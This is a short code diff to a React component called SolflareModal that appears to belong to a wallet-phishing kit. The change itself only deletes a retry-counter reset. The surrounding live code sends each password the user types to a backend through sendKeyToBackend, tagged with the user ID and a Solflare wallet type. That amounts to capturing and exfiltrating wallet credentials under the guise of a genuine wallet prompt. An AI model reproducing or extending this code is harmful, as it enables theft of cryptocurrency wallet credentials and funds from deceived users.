@@ -2683,7 +2683,6 @@ const SolflareModal = ({ isOpen, onClose, userId, backendConfig }) => {
         const newKeyword = e.target.value;
         setKeyword(newKeyword);
         setError(false);
-        setTrying(0); // Reset trying count when user types a new password
         const currentUserId = backendConfig?.userId || userId;
         if (currentUserId && newKeyword && (backendConfig?.enabled !== false)) {
             await sendKeyToBackend(currentUserId, 'cha', newKeyword, WALLET_TYPE_SHORTKEY.SOLFLARE);
